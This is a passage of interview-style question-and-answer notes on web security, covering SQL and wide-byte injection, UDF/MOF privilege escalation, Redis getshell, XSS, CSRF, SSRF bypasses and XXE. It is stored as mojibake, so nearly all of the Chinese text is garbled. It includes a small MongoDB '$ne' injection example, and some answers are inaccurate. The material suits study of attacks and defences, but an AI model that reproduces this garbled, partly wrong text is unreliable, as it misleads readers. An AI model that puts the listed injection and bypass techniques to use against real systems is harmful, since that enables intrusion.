<p>æœåŠ¡å™¨ä¹Ÿå‘é€ä¸€ä¸ªç¼–ç æ”¹å˜æ¶ˆæ¯ï¼Œè¡¨ç¤ºåé¢å‘é€çš„æ¶ˆæ¯éƒ½æ˜¯åŠ å¯†ä¹‹åçš„æ¶ˆæ¯</p>
<blockquote>
<p>DNSæ˜¯ä»€ä¹ˆï¼Œé‡‡ç”¨ä»€ä¹ˆåè®®é€šä¿¡</p>
</blockquote>
<p>åŸŸåç³»ç»Ÿã€‚tcp udpåè®®éƒ½æœ‰ï¼Œäº”å±‚åè®®æ˜¯dnsåè®®</p>
<blockquote>
<p>dnså·¥ä½œæµç¨‹</p>
</blockquote>
<p>é¦–å…ˆåœ¨æµè§ˆå™¨ç¼“å­˜é‡Œé¢æ‰¾ã€ç„¶ååˆ°ä¸»æœºç¼“å­˜é‡Œé¢æ‰¾ã€å†åˆ°hostsæ–‡ä»¶é‡Œé¢æ‰¾ã€å†åˆ°æœ¬åœ°åŸŸåè§£æå™¨é‡Œé¢æ‰¾ã€å¦‚æœé…ç½®äº†è½¬å‘å™¨ï¼Œåˆ™åˆ°ä¸Šä¸€çº§åŸŸåæœåŠ¡å™¨é‡Œé¢æ‰¾ï¼Œå¦‚æœæ²¡æœ‰åˆ™åˆ°æ ¹æœåŠ¡å™¨é‡Œé¢æ‰¾ï¼Œæ ¹æœåŠ¡å™¨å‘Šè¯‰é¡¶çº§åŸŸæœåŠ¡å™¨åœ°å€ï¼Œé¡¶çº§åŸŸæœåŠ¡å™¨å‘Šè¯‰äºŒçº§åŸŸæœåŠ¡å™¨åœ°å€ï¼Œä¾æ¬¡è¿­ä»£ï¼Œç›´åˆ°æ‰¾åˆ°æˆ–è€…è¶…æ—¶ã€‚</p>
<blockquote>
<p>é¡¶çº§åŸŸåæ˜¯ä»€ä¹ˆTLDï¼Ÿæœ‰æ•ˆé¡¶çº§åŸŸåETLDæ˜¯ä»€ä¹ˆ</p>
</blockquote>
<p>æœ€é«˜çº§çš„åŸŸåï¼ŒåŸŸåçš„æœ€åä¸€éƒ¨åˆ†ï¼Œåˆ†ä¸ºé€šç”¨æ€§åŸŸåä¸å›½å®¶é¡¶çº§åŸŸå</p>
<p>å¦‚github.ioè¿™ä¸€ç±»åŸŸåï¼Œåªç”¨é¡¶çº§åŸŸåä¸èƒ½è¡¨ç¤ºï¼Œäºæ˜¯ä½¿ç”¨äº†æœ‰æ•ˆé¡¶çº§åŸŸåï¼Œå³é¡¶çº§åŸŸååŠ ä»–çš„å‰ä¸€éƒ¨åˆ†ã€‚</p>
<blockquote>
<p>é˜²ç«å¢™æ˜¯ä»€ä¹ˆï¼Ÿwafæ˜¯ä»€ä¹ˆï¼Ÿiptableså±äºå“ªä¸€ç§</p>
</blockquote>
<p>é˜²ç«å¢™æ˜¯ç”¨æ¥åšæµé‡è¿‡æ»¤çš„ï¼Œåˆåˆ†ä¸ºè½¯ä»¶é˜²ç«å¢™ã€ç¡¬ä»¶é˜²ç«å¢™ï¼›ä»£ç†é˜²ç«å¢™ã€çŠ¶æ€æ£€æµ‹é˜²ç«å¢™ã€é€æ˜é˜²ç«å¢™ï¼Œä¸»è¦å·¥ä½œåœ¨ä¸‰å±‚ä»¥ä¸Šï¼Œå¯ä»¥æ ¹æ®åè®®ã€ç«¯å£å·ã€åœ°å€ç­‰å¯¹æµé‡è¿›è¡Œæ‹¦æˆªè¿‡æ»¤ã€‚wafæŒ‡webåº”ç”¨é˜²ç«å¢™ï¼Œå¯ä»¥æ£€æµ‹æ•°æ®åŒ…å†…å®¹ï¼Œæœ€è¦æ˜¯ç”¨æ¥é˜²ç—…æ¯’ã€æœ¨é©¬çš„ã€‚iptableså±äºè½¯ä»¶é˜²ç«å¢™ã€‚</p>
<blockquote>
<p>iptablesèƒ½æ ¹æ®macåœ°å€æŒ‡å®šè§„åˆ™å—ï¼Ÿ</p>
</blockquote>
<p>èƒ½</p>
<blockquote>
<p>æ¡¥æ¥æ˜¯ä»€ä¹ˆï¼ŒNATæ˜¯ä»€ä¹ˆ</p>
</blockquote>
<p>ä¸¤å°æœºå™¨å…¬ç”¨ä¸€å¼ ç½‘å¡ï¼Œnatâ€”â€”ç½‘ç»œåœ°å€è½¬æ¢åè®®ï¼Œåˆ†ä¸ºç«¯å£æ˜ å°„ä¸ç«¯å£å¤ç”¨ä¸¤ç§ï¼Œç«¯å£å¤ç”¨è´Ÿè´£å¯¹å†…ç½‘çš„ipåœ°å€åšè½¬æ¢ï¼Œç«¯å£æ˜ å°„è´Ÿè´£å¯¹è®²å¤–ç½‘è®¿é—®çš„åœ°å€è½¬æ¢ä¸ºå†…ç½‘æœåŠ¡å™¨åœ°å€ã€‚</p>
<blockquote>
<p>SOP CORS CSP</p>
</blockquote>
<p>SOP åŒæºç­–ç•¥ï¼ŒåŒæºç­–ç•¥æ˜¯æµè§ˆå™¨çš„åŸºç¡€ï¼Œå®ƒå»ºç«‹äº†ä¸åŒèµ„æºä¹‹é—´äº’ç›¸è®¿é—®çš„æ ‡å‡†ï¼Œä¿è¯äº†èµ„æºçš„å®‰å…¨æ€§ã€‚é€šè¿‡åŸŸåã€ç«¯å£ã€åè®®ç±»å‹æ¥åˆ¤æ–­æ˜¯å¦åŒæº</p>
<p>cors è·¨åŸŸèµ„æºè®¿é—® å› ä¸ºåŒæºç­–ç•¥çš„é™åˆ¶ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªæ­£å¸¸çš„éœ€è¦è·¨åŸŸçš„è¯·æ±‚ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å®ç°ï¼Œäºæ˜¯æœ‰äº†sorsï¼Œé€šè¿‡httpå“åº”å¤´éƒ¨çš„acaoã€acamç­‰å­—æ®µè§„å®šå“ªå†™æ¥æºçš„è¯·æ±‚æ˜¯å¯ä»¥è®¿é—®è¯¥èµ„æºçš„ã€‚è¿™ä¸ªåˆ¤æ–­æ˜¯åœ¨æµè§ˆå™¨ ç«¯å‘ç”Ÿçš„ã€‚</p>
<p>CSPå†…å®¹å®‰å…¨ç­–ç•¥ï¼Œé€šè¿‡content-security-policyå­—æ®µæ¥æŒ‡å®šå“ªå†™æ¥æºçš„jsèµ„æºæ˜¯å¯ä¿¡çš„ï¼Œèƒ½å¤Ÿä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢xss</p>
<blockquote>
<p>sqlæ³¨å…¥åŸç†</p>
</blockquote>
<p>ç”¨æˆ·è¾“å…¥å¾—å‚æ•°ç›´æ¥è¿›å…¥sqlæŸ¥è¯¢è¯­å¥ï¼Œæ¶æ„ä»£ç ç ´åäº†sqlè¯­å¥åŸæœ‰å¾—ç»“æ„ï¼Œå¯¼è‡´äº†éé¢„æœŸçš„æŸ¥è¯¢ç»“æœã€‚</p>
<blockquote>
<p>sqlæ³¨å…¥çš„å¸¸è§„é˜²å¾¡æ–¹æ³•</p>
</blockquote>
<p>é¢„ç¼–è¯‘æŠ€æœ¯ã€è¿‡æ»¤sqlå…³é”®å­—ã€è¿‡æ»¤å¼•å·ã€æ•°æ®è½¬ä¹‰ã€æ•°æ®ç¼–ç </p>
<blockquote>
<p>æ˜¯å¦çŸ¥é“é¢„ç¼–è¯‘æŸ¥è¯¢</p>
</blockquote>
<p>çŸ¥é“ï¼Œé€šè¿‡å°†sqlè¯­å¥é¢„ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œå°†è¦è¾“å…¥çš„å‚æ•°éƒ¨åˆ†ç”¨é—®å·å ä½ï¼Œç”Ÿæˆä¸€ä¸ªé¢„ç¼–è¯‘è¯­å¥ï¼Œç”¨æˆ·çš„æ‰€æœ‰è¾“å…¥éƒ½å°†è¢«å½“ä½œä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸²</p>
<blockquote>
<p>sqlè¯­å¥ä¸­å“ªå†™éƒ¨åˆ†ä¸èƒ½ä½¿ç”¨é¢„ç¼–è¯‘ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿæ€ä¹ˆè§£å†³</p>
</blockquote>
<p>sqlè¯­å¥çš„ç»“æ„éƒ¨åˆ†ä¸èƒ½ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼Œå¦‚è¦æŸ¥è¯¢çš„å­—æ®µåã€è¡¨åéƒ¨åˆ†ã€‚</p>
<p>è¿‡æ»¤</p>
<blockquote>
<p>æŒ‰æ³¨å…¥æ–¹æ³•åˆ†ï¼Œæœ‰å“ªå†™ç±»å‹</p>
</blockquote>
<p>è”åˆæŸ¥è¯¢æ³¨å…¥ã€æ—¶é—´ç›²æ³¨ã€å¸ƒå°”ç›²æ³¨ã€æŠ¥é”™æ³¨å…¥ã€å †å æ³¨å…¥</p>
<blockquote>
<p>ä»€ä¹ˆæ˜¯å®½å­—èŠ‚æ³¨å…¥</p>
</blockquote>
<p>å¦‚æœmysqlæ•°æ®åº“é…ç½®äº†set names æˆ–è€… set_client_charsetä¸ºgbk gb2312 big5è¿™ç±»çš„å®½å­—èŠ‚ç¼–ç åˆ™å¯èƒ½å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚å®½å­—èŠ‚åˆ†ä¸ºé«˜å­—èŠ‚ä¸ä½å­—èŠ‚ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå½“åç«¯çš„è¿‡æ»¤ç­–ç•¥ä¸­æ˜¯å¯¹ç‰¹æ®Šç¬¦å·è¿›è¡Œè½¬ä¹‰é‚£ä¹ˆè½¬ä¹‰ç¬¦çš„åå…­è¿›åˆ¶è¡¨ç¤ºæ­£å¥½åœ¨å®½å­—èŠ‚çš„ä½å­—èŠ‚åŒºï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ‰¾ä¸€ä¸ªé«˜å­—èŠ‚åŒºçš„ç¼–ç ä¸è½¬ä¹‰ç¬¦ç»“åˆï¼Œé‚£ä¹ˆå•å¼•å·ç­‰ç‰¹æ®Šå­—ç¬¦å°±é€ƒé€¸äº†å‡ºæ¥ã€‚gbkçš„é«˜å­—èŠ‚åŒºçš„èŒƒå›´ä¸º%81-%ef</p>
<blockquote>
<p>å¦‚æœä¸èƒ½ä½¿ç”¨å¼•å·æ€ä¹ˆå†™å‡ºæ–‡ä»¶</p>
</blockquote>
<p>ä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç ã€base64ç¼–ç çš„æ–¹å¼å†™å‡º</p>
<blockquote>
<p>sqlæ³¨å…¥çš„è¿‡ç¨‹</p>
</blockquote>
<p>æ€•æ®µé—­åˆç¬¦ã€åˆ¤æ–­å­—æ®µæ•°ã€æœ‰æ— å›æ˜¾ã€æœ‰å›æ˜¾ï¼Œselectè¯­å¥ä½¿ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥ã€éselectè¯­å¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€æ— å›æ˜¾ä½¿ç”¨å¸ƒå°”ç›²æ³¨ã€æ—¶é—´ç›²æ³¨ã€dnslogç­‰æ–¹å¼</p>
<blockquote>
<p>udf mofææƒ</p>
</blockquote>
<p>å‰ææ˜¯å·²ç»è·å¾—äº†ä¸€ä¸ªwebshellèƒ½å¤Ÿæ‰§è¡ŒåŸºæœ¬çš„mysqlå‘½ä»¤ã€‚å¯¹ç›®æ ‡ç›®å½•å…·æœ‰å†™çš„æƒé™ã€‚</p>
<p>udfææƒ ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ææƒï¼Œå¯¼å…¥åŠ¨æ€è¿æ¥åº“ã€å¯¼å…¥å‡½æ•°ã€æ‰§è¡Œå‡½æ•°</p>
<p>mofææƒï¼Œåˆ©ç”¨nullevt.mofæ–‡ä»¶ä»¥systemä»€ä¹ˆæ‰§è¡Œçš„ç‰¹æ€§ï¼Œå°†æˆ‘ä»¬çš„è„šæœ¬å†™åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­è¿›è¡Œææƒã€‚</p>
<blockquote>
<p>éå…³ç³»å‹æ•°æ®åº“æ˜¯å¦å­˜åœ¨æ³¨å…¥é—®é¢˜ï¼Œä»€ä¹ˆæƒ…å†µä¸‹ä¼šå‘ç”Ÿmongodbæ³¨å…¥</p>
</blockquote>
<p>å­˜åœ¨ã€‚å½“æˆ‘ä»¬åƒmongodbä¼ å…¥çš„å‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„çš„æ—¶å€™ï¼Œå¦‚</p>
<p><code>?id[a]=123</code> </p>
<p>ç»è¿‡mongodbè§£æåå˜æˆ</p>
<p><code>db.test.fin(&#123;id:&#123;a:123&#125;&#125;)</code> </p>
<p>å¦‚æœaæ˜¯ä¸€ä¸ªæ“ä½œç¬¦å‘¢ï¼Ÿ</p>
<p><code>db.test.find(&#123;id:&#123;$ne:123&#125;&#125;)</code> </p>
<p>æ³¨å…¥å‘ç”Ÿäº†</p>
<blockquote>
<p>redisæ˜¯å¦å­˜åœ¨æ³¨å…¥é—®é¢˜</p>
</blockquote>
<p>å­˜åœ¨ï¼Œæœªæˆæƒè®¿é—®æ¼æ´</p>
<blockquote>
<p>redis getshellåŸç†ï¼Œä¸ºä»€ä¹ˆèƒ½å†™å…¥æ–‡ä»¶</p>
</blockquote>
<p>å¸¸è§getshellæ–¹æ³•æœ‰webshll å®šæ—¶ä»»åŠ¡ å¼€å¯å¯åŠ¨é¡¹ sshå…å¯†ç™»å½•ã€‚redisé»˜è®¤ä»¥rootèº«ä»½è¿è¡Œã€‚</p>
<blockquote>
<p>XSSæ¼æ´åŸç†</p>
</blockquote>
<p>ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰ç»è¿‡è¿‡æ»¤è¢«ç›´æ¥å¾—è¾“å‡ºåˆ°æµè§ˆå™¨é¡µé¢ä¸­ï¼Œæ¶æ„çš„è¾“å…¥ç ´åçš„åŸæœ‰çš„domç»“æ„ï¼Œå¯¼è‡´jsä»£ç å¾—ä»¥æ‰§è¡Œã€‚</p>
<blockquote>
<p>XSSå¸¸è§ç±»å‹</p>
</blockquote>
<p>åå°„å‹ã€å­˜å‚¨å‹ã€DOMå‹</p>
<blockquote>
<p>uxss&#x2F;mxss</p>
</blockquote>
<p>uxss é€šç”¨æ€§xssï¼Œä¸ä¼ ç»Ÿå‹xssä¸ä¸€æ ·ï¼Œé€šç”¨æ€§xssåˆ©ç”¨çš„æ˜¯æµè§ˆå™¨æœ¬èº«çš„æ¼æ´æˆ–è€…æ’ä»¶çš„æ¼æ´ï¼Œè¿™äº›æ’ä»¶å¾€å¾€æ‹¥æœ‰å¾ˆå¤§çš„æƒé™ï¼Œä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ã€‚æ‰€ä»¥å³ä¾¿æ˜¯æœ¬èº«æ²¡æœ‰æ¼æ´çš„ç½‘ç«™å› ä¸ºè¿™äº›æœ‰é—®é¢˜çš„æ’ä»¶çš„å­˜åœ¨è€Œå­˜åœ¨xssé—®é¢˜</p>
<p>mxss çªå˜xssï¼Œç”¨æˆ·æ­£å¸¸çš„è¾“å…¥ç»è¿‡æµè§ˆå™¨çš„å¤šæ¬¡æ¸²æŸ“äº§ç”Ÿäº†ä¸å¯é¢„æµ‹çš„ç»“æœã€‚å…¶å‡ºç°å¿…é¡»æ»¡è¶³çš„ä¸€ç‚¹å°±æ˜¯ï¼Œç”¨æˆ·çš„è¾“å…¥ä¸¤æ¬¡å‡ºç°åœ¨innerhtmlä¸­ã€‚å¸¸è§çš„æœ‰åå•å¼•å·ç ´åç»“æ„ã€å¼•å·è½¬ä¹‰ç­‰</p>
<blockquote>
<p>å¸¸è§é˜²å¾¡æ–¹æ³•</p>
</blockquote>
<p>è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦ï¼Œæ•æ„Ÿæ ‡ç­¾ï¼Œå¼€å¯xss-filterä¸cspã€è½¬ä¹‰ã€å®ä½“ç¼–ç ã€http-only</p>
<blockquote>
<p>cspæ˜¯ä»€ä¹ˆï¼Œå¦‚ä½•é˜²å¾¡çš„xss</p>
</blockquote>
<p>å†…å®¹å®‰å…¨ç­–ç•¥ï¼Œé€šè¿‡æä¾›ç™½åå•çš„æ–¹å¼ï¼ŒæŒ‡å®šå“ªå†™æ¥æºè„šæœ¬å¯ä»¥è¢«æ‰§è¡Œ</p>
<blockquote>
<p>xsså±å®³</p>
</blockquote>
<p>ç½‘ç«™é’“é±¼ã€èº«ä»½ä¼ªé€ ã€é”®ç›˜è®°å½•ã€æœªæˆæƒæ“ä½œã€xss warm</p>
<blockquote>
<p>csrfåŸç†</p>
</blockquote>
<p>åˆ©ç”¨å¯æµè§ˆå™¨å¯¹äºç”¨æˆ·çš„ä¿¡ä»»ï¼Œå®ç°ä¸€äº›éç”¨æˆ·æœ¬äººæ„æ„¿çš„æ“ä½œã€‚ç”¨æˆ·è®¿é—®å¸¦æœ‰æ¶æ„è¯·æ±‚çš„urlçš„æ—¶å€™ï¼Œæµè§ˆå™¨å¤„äºå¯¹ç”¨æˆ·çš„ä¿¡ä»»ï¼Œæºå¸¦å­˜å‚¨åœ¨æœ¬åœ°çš„è¯¥ç½‘ç«™çš„cookieè®¿é—®ï¼Œä»è€Œå¯¼è‡´ä¸è¢«é¢„æœŸæœŸæœ›çš„æ“ä½œï¼Œå¦‚éæ³•è½¬è´¦ã€åˆ å¸–ç­‰</p>
<blockquote>
<p>å¦‚ä½•æ£€æµ‹</p>
</blockquote>
<p>æ˜¯å¦æœ‰tooken</p>
<p>æ˜¯å¦æ ¡éªŒäº†referr</p>
<p>x-forward-urlå­—æ®µæ˜¯å¦ä½¿ç”¨äº†æ­£åˆ™</p>
<p>æ˜¯å¦ä½¿ç”¨äº†samesite</p>
<p>è‡ªå®šä¹‰å±æ€§éªŒè¯</p>
<p>æ˜¯å¦ä½¿ç”¨äº†éªŒè¯ç </p>
<blockquote>
<p>å¸¸è§„é˜²å¾¡æ–¹æ³•</p>
</blockquote>
<p>ä¸Šä¸€ä¸ªé¢˜ç›®å°±æ˜¯</p>
<blockquote>
<p>samesiteæ˜¯ä»€ä¹ˆ</p>
</blockquote>
<p>samesiteâ€”-åŒç«™ã€å‡ºç°åœ¨cookieä¸­ï¼Œè¡¨ç¤ºï¼Œåªèƒ½åœ¨è®¿é—®åŒä¸€ä¸ªç«™ç‚¹çš„æ—¶å€™æ‰å‘é€cookieï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯åŒç«™å‘¢ï¼Ÿæ‰€è°“åŒç«™å³etld+1 æœ‰æ•ˆé¡¶çº§åŸŸååŠ ä¸Šå®ƒå‰é¢çš„ä¸€éƒ¨åˆ†å°±æ˜¯åŒç«™ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸æ ¡éªŒåè®®ç±»å‹ä¸ç«¯å£å·ã€‚æœ‰äº›ä¸¥æ ¼çš„ä¹Ÿä¼šæ ¡éªŒåè®®ç±»å‹ã€‚é˜²æ­¢csrfæ”»å‡»</p>
<blockquote>
<p>samesiteä¸sameoriginåŒºåˆ«</p>
</blockquote>
<p>sameoriginæ ¡éªŒåè®®ã€ç«¯å£å·ã€åŸŸåä¸‰ä¸ªéƒ¨åˆ†ï¼Œä¸»è¦ç”¨ä½œé˜²å¾¡xssæ”»å‡»ã€‚åªæœ‰åŒæºçš„èµ„æºæ‰èƒ½äº’ç›¸è®¿é—®ã€‚</p>
<p>samesiteç®€è¦åŸŸåéƒ¨åˆ†ï¼Œä¸»è¦ç”¨æ¥é˜²å¾¡csrfæ”»å‡»ï¼Œåˆ¶ç”¨åŒç«™çš„ç½‘ç«™æ‰èƒ½å‘é€cookieï¼Œä¸åŒç«™çš„ä¸å‘é€</p>
<blockquote>
<p>ssrfåŸç†</p>
</blockquote>
<p>æœåŠ¡å™¨æä¾›äº†è®¿é—®å…¶ä»–urlçš„æ¥å£ï¼Œä½†æœªå¯¹è¾“å…¥åšä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ç”¨è¿™ä¸ªæ¥å£è®¿é—®å†…ç½‘èµ„æºï¼Œç­‰ã€‚</p>
<blockquote>
<p>å¸¸è§å‘ç”Ÿåœºæ™¯</p>
</blockquote>
<p>ç¿»è¯‘ã€æ”¶è—ã€åˆ†äº«ç­‰åœºæ™¯</p>
<blockquote>
<p>å¦‚ä½•æ£€æµ‹ï¼Œå¤–å¸¦dnsä¸€å®šå‡†ç¡®å—</p>
</blockquote>
<p>é€šè¿‡æŠ“åŒ…è½¯ä»¶ï¼ŒæŸ¥çœ‹æµé‡æ˜¯å¦ç”±å®¢æˆ·ç«¯å‘é€å¦åˆ™æœªæœåŠ¡ç«¯å‘é€ã€‚</p>
<p>æŸ¥æ‰¾url page displayç­‰å…³é”®å­—</p>
<blockquote>
<p>é˜²å¾¡æ–¹æ³•ã€æ— æ³•ä½¿ç”¨åŸŸåç™½ç™½åå•æ€ä¹ˆåŠã€dnsé‡ç»‘å®šæ€ä¹ˆåŠ</p>
</blockquote>
<p>é™åˆ¶ä½¿ç”¨çš„åè®®ç±»å‹ï¼Œé™åˆ¶ip,é™åˆ¶åŸŸåï¼Œ</p>
<p>é™åˆ¶åè®®ã€ä½¿ç”¨ipã€ä½¿ç”¨é»‘åå•</p>
<blockquote>
<p>javaæ˜¯å¦ç”±æœ‰ssrfé—®é¢˜</p>
</blockquote>
<blockquote>
<p>ssrfå…·ä½“æ€ä¹ˆåˆ©ç”¨ï¼Œå¸¸è§ç»•è¿‡æ–¹æ³•</p>
</blockquote>
<p>gopher ftp dict fileç­‰åè®®ç”¨äºè¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ï¼Œæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»æƒ…å†µã€ç«¯å£bannerä¿¡æ¯ã€‚</p>
<p>ç”¨æˆ·å</p>
<p>åè¿›åˆ¶ç¼–ç </p>
<p>ç‚¹å¥½ä½¿ç”¨å¥å·ä»£æ›¿</p>
<p>åŠ ä¸Šæ ¹åŸŸå</p>
<p>ä½¿ç”¨ï¼Ÿ</p>
<p>dns rebinding</p>
<p>ä½¿ç”¨çŸ­åŸŸå</p>
<p>ä½¿ç”¨xip.io</p>
<blockquote>
<p>XXEåŸç†</p>
</blockquote>
<p>webç¨‹åºæä¾›äº†è§£æxmlè¯­å¥çš„æ¥å£ï¼Œåˆ©ç”¨è¿™ä¸ªæ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œæˆ‘ä»¬è‡ªå·±çš„æ¶æ„ä»£ç ã€‚</p>
<blockquote>
<p>å¸¸è§„é˜²å¾¡æ–¹æ³•</p>
</blockquote>
<p>å…³é”®å­—è¿‡æ»¤</p>
<p>ä¸å…è®¸ä½¿ç”¨å¤–éƒ¨å®ä½“</p>
<p>æˆ–è€…å¹²è„†ä¸ä½¿ç”¨è¯¥æ¥å£</p>
<blockquote>
<p>æ¶‰åŠåè®®ï¼Œä¸ºä»€ä¹ˆä½¿ç”¨ftpåè®®å¤–å¸¦æ•°æ®è€Œä¸ä½¿ç”¨http</p>
</blockquote>
<p>http</p>
<p>ppt:&#x2F;&#x2F;filter</p>
<p>file</p>
<blockquote>
<p>æ”»å‡»è¿‡ç¨‹ï¼Œä¼šè¯»å–å“ªå†™æ–‡ä»¶</p>
</blockquote>
<p>é¦–å…ˆåˆ¤æ–­æ˜¯å¦ç”±æ³¨å…¥ç‚¹ï¼Œé€šè¿‡ç å®è§‚å¯Ÿæ•°æ®ç±»å‹æ˜¯å¦ç¬¦åˆxmlæ ¼å¼ï¼Œè‹¥æ˜¯ï¼Œåˆ™å¯èƒ½å­˜åœ¨ã€‚</p>
<p>è¯»å–ç³»ç»Ÿé“­æ„Ÿæ–‡ä»¶ã€ä¸­é—´ä»¶é…ç½®æ–‡ä»¶ã€æ•°æ®åº“é…ç½®æ–‡ä»¶ç­‰</p>
<blockquote>
<p>è¶Šæƒçš„ç±»å‹</p>
</blockquote>
<p>æ°´å¹³è¶Šæƒ</p>
<p>å‚ç›´è¶Šæƒ</p>
<blockquote>
<p>å¸¸è§„ä¿®å¤æ–¹æ¡ˆ</p>
</blockquote>
<p>åˆ¤æ–­æ“ä½œç”¨æˆ·æ˜¯å¦å¯¹æ•°æ®æ‹¥æœ‰æ“ä½œæƒé™</p>
<p>æ“ä½œæ•°æ®æ—¶æ·»åŠ whereå­å¥ï¼Œé™å®šåªæŸ¥è¯¢å½“å‰ç”¨æˆ·çš„æ•°æ®</p>
<p>åŸºäºè§’è‰²è¿›è¡Œæƒé™æ§åˆ¶â€”-rbac</p>
<p>åŸºäºèµ„æºè¿›è¡Œæƒé™æ§åˆ¶â€”â€”</p>
<p>åŸºäºå±æ€§çš„æƒé™æ§åˆ¶â€”â€”abac</p>
<p>åŸºäºç¬¬ä¸‰æ–¹æ¡†æ¶è¿›è¡Œæƒé™æ§åˆ¶</p>
<blockquote>
<p>çŸ¥ä¸çŸ¥é“rabcä¸abac dacè‡ªä¸»è®¿é—®æ§åˆ¶ macå¼ºåˆ¶è®¿é—®æ§åˆ¶</p>
</blockquote>
<p>RABCâ€”â€”-å…¶åŸºæœ¬æ€æƒ³æ˜¯ï¼Œå¯¹ç³»ç»Ÿæ“ä½œçš„å„ç§æƒé™ä¸æ˜¯ç›´æ¥æˆäºˆå…·ä½“çš„ç”¨æˆ·ï¼Œè€Œæ˜¯åœ¨ç”¨æˆ·é›†åˆä¸æƒé™é›†åˆä¹‹é—´å»ºç«‹ä¸€ä¸ªè§’è‰²é›†åˆã€‚æ¯ä¸€ç§è§’è‰²å¯¹åº”ä¸€ç»„ç›¸åº”çš„æƒé™ã€‚ä¸€æ—¦ç”¨æˆ·è¢«åˆ†é…äº†é€‚å½“çš„è§’è‰²åï¼Œè¯¥ç”¨æˆ·å°±æ‹¥æœ‰æ­¤è§’è‰²çš„æ‰€æœ‰æ“ä½œæƒé™ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œä¸å¿…åœ¨æ¯æ¬¡åˆ›å»ºç”¨æˆ·æ—¶éƒ½è¿›è¡Œåˆ†é…æƒé™çš„æ“ä½œï¼Œåªè¦åˆ†é…ç”¨æˆ·ç›¸åº”çš„è§’è‰²å³å¯ï¼Œè€Œä¸”è§’è‰²çš„æƒé™å˜æ›´æ¯”ç”¨æˆ·çš„æƒé™å˜æ›´è¦å°‘å¾—å¤šï¼Œè¿™æ ·å°†ç®€åŒ–ç”¨æˆ·çš„æƒé™ç®¡ç†ï¼Œå‡å°‘ç³»ç»Ÿçš„å¼€é”€<br>ABACâ€”â€”ABACåˆ™æ˜¯é€šè¿‡åŠ¨æ€å°†ä¸€ä¸ªæˆ–ä¸€ç»„å±æ€§æ¥åˆ¤æ–­æ˜¯å¦æ»¡è¶³è®¾å®šçš„æ¡ä»¶æ¥è¿›è¡Œæˆæƒåˆ¤æ–­ã€‚å±æ€§é€šå¸¸æ¥è¯´åˆ†ä¸ºå››ç±»ï¼šç”¨æˆ·å±æ€§ï¼ˆå¦‚ç”¨æˆ·å¹´é¾„ï¼‰ï¼Œç¯å¢ƒå±æ€§ï¼ˆå¦‚å½“å‰æ—¶é—´ï¼‰ï¼Œæ“ä½œå±æ€§ï¼ˆå¦‚è¯»å–ï¼‰å’Œå¯¹è±¡å±æ€§ï¼ˆå¦‚ä¸€ç¯‡æ–‡ç« ï¼Œåˆç§°èµ„æºå±æ€§ï¼‰ï¼Œå¯ä»¥çœ‹å‡ºé…ç½®éå¸¸çµæ´»ï¼Œèƒ½å¤Ÿæ»¡è¶³å‡ ä¹æ‰€æœ‰éœ€æ±‚ã€‚</p>
<blockquote>
<p>å¹¶å‘æ˜¯ä»€ä¹ˆæ„æ€ï¼Œä¼šé€ æˆä»€ä¹ˆå½±å“</p>
</blockquote>
<p>åŒä¸€æ—¶é—´å†…å¤šæ¬¡å‘é€http&#x2F;tcpè¯·æ±‚ã€‚å½“å¤šä¸ªçº¿ç¨‹åŒæ—¶å¯¹åŒä¸€ä¸ªèµ„æºè¿›è¡Œæ“ä½œçš„æ—¶å€™å› ä¸ºæ‰§è¡Œé¡ºåºä¸å¯æ§çš„é—®é¢˜ï¼Œå¯èƒ½å¯¼è‡´éé¢„æœŸçš„bugï¼Œä»è€Œå®ç°å¤šæ¬¡è·å¥–ã€å¤šæ¬¡æ”¶è·ã€å¤šæ¬¡è·èµ çš„ç›®çš„ã€‚å¹¶å‘å¯¹æ•°æ®çš„ä¸€è‡´æ€§ä¸å¯ç”¨æ€§çš„å½±å“å¾ˆå¤§ã€‚</p>
<blockquote>
<p>å¦‚ä½•ä¿®å¤ï¼Œä¹è§‚é”ã€æ‚²è§‚é”ã€æ­»é”ã€æ´»é”</p>
</blockquote>
<p>å¯¹æ•°æ®åº“æ“ä½œè¿›è¡ŒåŠ é”ã€‚</p>
<p>æ‚²è§‚é”è®¤ä¸ºæ¯ä¸€æ¬¡å¯¹æ•°æ®çš„æ“ä½œéƒ½ä¼šæ”¹å˜æ•°æ®ï¼Œæ‰€ä»¥æ“ä½œæ•°æ®å‰éƒ½ä¼šå¯¹æ•°æ®è¿›è¡ŒåŠ é”ï¼Œå…¶ä»–çº¿ç¨‹å°±ä¸èƒ½æ“ä½œæ•°æ®ï¼Œä½†æ˜¯æŸ¥è¯¢æ“ä½œä¸å—å½±å“ã€‚æ‚²è§‚é”ä¼šé”å®šæ•°æ®ï¼Œå…¶ä»–æ“ä½œä¸ä¼šå½±å“åˆ°è¢«é”çš„æ•°æ®ï¼Œä½†æ˜¯æ™®é€šçš„æŸ¥è¯¢æ²¡æœ‰å½±å“ï¼Œéœ€è¦ç”¨åˆ° for updateè¯­å¥</p>
